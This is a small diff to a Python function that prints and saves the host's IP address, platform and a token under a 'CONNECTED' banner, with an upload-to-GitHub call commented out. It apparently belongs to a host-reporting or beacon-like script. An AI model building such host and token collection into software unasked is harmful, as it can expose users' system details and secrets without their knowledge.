@@ -48,7 +48,7 @@ def run(token):
         print('Linux: ', sysconfig.get_platform(),' === CONNECTED ') 
         print(' IpAddress: ', IPAddr)
         print('TokenData: ', token)
-        stmnt= 'Info: '+ IPAddr+' System:'+sysconfig.get_platform()+'\n'
+        stmnt= 'Info: '+ IPAddr+' System:'+sysconfig.get_platform()
         print(stmnt)
 	create_file(fname,stmnt)
         #upload_file_to_github(archive)
